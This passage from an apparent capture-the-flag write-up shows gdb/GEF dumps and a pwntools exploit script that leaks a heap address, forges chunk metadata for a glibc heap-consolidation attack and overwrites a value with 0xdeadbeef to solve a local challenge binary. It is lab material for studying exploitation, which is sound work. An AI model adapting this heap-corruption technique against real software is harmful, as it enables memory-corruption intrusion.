$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x000055d952dc58c0  →  0x00000000000005f0
$r11   : 0x246        	 
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x00000000deadbeef
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
0x00007ffd1a01b8a0│+0x0030: 0x00000000000005e0
0x00007ffd1a01b8a8│+0x0038: 0x000055d952dc52e0  →  "00000000000000000000000000000000000000000000000000[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d952496455 <main+424>   	jne	0x55d952496466 <main+441>
   0x55d952496457 <main+426>   	lea	rax, [rip+0xc45]    	# 0x55d9524970a3
   0x55d95249645e <main+433>   	mov	rdi, rax
 → 0x55d952496461 <main+436>   	call   0x55d9524960e0 <puts@plt>
   ↳  0x55d9524960e0 <puts@plt+0> 	endbr64
  	0x55d9524960e4 <puts@plt+4> 	bnd	jmp QWORD PTR [rip+0x2ead]    	# 0x55d952498f98 <puts@got.plt>
  	0x55d9524960eb <puts@plt+11>	nop	DWORD PTR [rax+rax*1+0x0]
  	0x55d9524960f0 <__stack_chk_fail@plt+0> endbr64
  	0x55d9524960f4 <__stack_chk_fail@plt+4> bnd	jmp QWORD PTR [rip+0x2ea5]    	# 0x55d952498fa0 <__stack_chk_fail@got.plt>
  	0x55d9524960fb <__stack_chk_fail@plt+11> nop	DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   $rdi = 0x000055d9524970a3 → "You solved the chall!\n"
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d952496461 in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d952496461 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rdi
0x55d9524970a3:    "You solved the chall!\n"
gef➤  c
Continuing.
[Inferior 1 (process 51971) exited with code 027]
```

We see here, we were able to overwrite the value with `0xdeadbeef`, and solve the challenge.

Also if you want, here is a solution that actually leverages heap consolidation:

```
from pwn import *

target = process("./chall-04")
#gdb.attach(target)

INDEX = b"16"

ALLOCATION_SIZE = b"1584"

ALLOCATION_CHUNK_CONTENTS = b"0"*0x500 + p32(0xdeadbeef)

target.recvuntil(b"Chunk0: ")
leak_string = target.recvuntil(b"\n")
leak_value = int(leak_string, 0x10)
heap_base = leak_value - 0x2a0

print("Heap Base is: " + hex(heap_base))

FAKE_MAIN_ARENA_ADDRESS = heap_base + 0x8f0
FAKE_CHUNK_ADDRESS = heap_base + 0x8c0

CONTENTS_CHUNK0 = p64(0x00) + p64(0x621)
CONTENTS_CHUNK1 = p64(0x00) + \
   				 p64(0x021) + \
   				 p64(FAKE_MAIN_ARENA_ADDRESS - 0x10)*2 + \
   				 p64(0x20) + \
   				 p64(0x20) + \
   				 p64(FAKE_CHUNK_ADDRESS)*2

target.recvuntil(b"Chunk0 Contents:\n")
target.send(CONTENTS_CHUNK0)

target.recvuntil(b"Chunk1 Contents:\n")
target.send(CONTENTS_CHUNK1)

target.recvuntil(b"Index?\n")
target.sendline(INDEX)

target.recvuntil(b"Size of the chunk allocation?\n")
target.sendline(ALLOCATION_SIZE)

target.recvuntil(b"Allocation Chunk Contents.\n")
target.send(ALLOCATION_CHUNK_CONTENTS)

target.interactive()
```

Also, we can get the offset from our heap infoleak to the heap base like this:

```
$   gdb ./chall-04
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
	<http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./chall-04...
(No debugging symbols found in ./chall-04)
gef➤  r
Starting program: /Hackery/shogun/challs/04/chall-04
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Chunk0: 0x5555555592a0

Chunk0 Contents:
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7cf4951 in __GI___libc_read (fd=0x0, buf=0x5555555592a0, nbytes=0x50) at ../sysdeps/unix/sysv/linux/read.c:26
26      return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x0          	 
$rcx   : 0x00007ffff7cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x50         	 
$rsp   : 0x00007fffffffdfd8  →  0x0000555555555365  →  <main+184> lea rax, [rip+0xcb7]    	# 0x555555556023
$rbp   : 0x00007fffffffe020  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  0x0000000000000000
$rdi   : 0x0          	 
$rip   : 0x00007ffff7cf4951  →  0x5777fffff0003d48 ("H="?)
$r8	: 0x3          	 
$r9	: 0x77         	 
$r10   : 0x5d         	 
$r11   : 0x246        	 
$r12   : 0x00007fffffffe138  →  0x00007fffffffe433  →  "/Hackery/shogun/challs/04/chall-04"
$r13   : 0x00005555555552ad  →  <main+0> endbr64
$r14   : 0x0000555555557d70  →  0x0000555555555200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfd8│+0x0000: 0x0000555555555365  →  <main+184> lea rax, [rip+0xcb7]    	# 0x555555556023     ← $rsp
0x00007fffffffdfe0│+0x0008: 0x0000000000000000
0x00007fffffffdfe8│+0x0010: 0x00005555555592a0  →  0x0000000000000000
0x00007fffffffdff0│+0x0018: 0x00005555555597b0  →  0x0000000000000000
0x00007fffffffdff8│+0x0020: 0x00005555555598c0  →  0x0000000000000000
0x00007fffffffe000│+0x0028: 0x0000000000000000
0x00007fffffffe008│+0x0030: 0x0000000000000000
0x00007fffffffe010│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7cf494b <read+11>    	je 	0x7ffff7cf4960 <__GI___libc_read+32>
   0x7ffff7cf494d <read+13>    	xor	eax, eax
   0x7ffff7cf494f <read+15>    	syscall
 → 0x7ffff7cf4951 <read+17>    	cmp	rax, 0xfffffffffffff000
   0x7ffff7cf4957 <read+23>    	ja 	0x7ffff7cf49b0 <__GI___libc_read+112>
   0x7ffff7cf4959 <read+25>    	ret    
   0x7ffff7cf495a <read+26>    	nop	WORD PTR [rax+rax*1+0x0]
   0x7ffff7cf4960 <read+32>    	sub	rsp, 0x28
   0x7ffff7cf4964 <read+36>    	mov	QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
 	21    
 	22     /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
 	23     ssize_t
 	24     __libc_read (int fd, void *buf, size_t nbytes)
 	25     {
 →   26   	return SYSCALL_CANCEL (read, fd, buf, nbytes);
 	27     }
 	28     libc_hidden_def (__libc_read)
 	29    
 	30     libc_hidden_def (__read)
 	31     weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x7ffff7cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7cf4951 → __GI___libc_read(fd=0x0, buf=0x5555555592a0, nbytes=0x50)
[#1] 0x555555555365 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /Hackery/shogun/challs/04/chall-04
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /Hackery/shogun/challs/04/chall-04
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /Hackery/shogun/challs/04/chall-04
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /Hackery/shogun/challs/04/chall-04
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /Hackery/shogun/challs/04/chall-04
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7c00000 0x00007ffff7c22000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7c22000 0x00007ffff7d72000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7d72000 0x00007ffff7dc8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7dc8000 0x00007ffff7dc9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7dc9000 0x00007ffff7e2c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7e2c000 0x00007ffff7e2e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007ffff7e2e000 0x00007ffff7e3b000 0x0000000000000000 rw-
0x00007ffff7fbe000 0x00007ffff7fc3000 0x0000000000000000 rw-
0x00007ffff7fc3000 0x00007ffff7fc7000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc7000 0x00007ffff7fc9000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc9000 0x00007ffff7fca000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffff7fca000 0x00007ffff7ff0000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffff7ff0000 0x00007ffff7ffa000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

And we see, the offset is `0x5555555592a0 - 0x0000555555559000 = 0x2a0`.
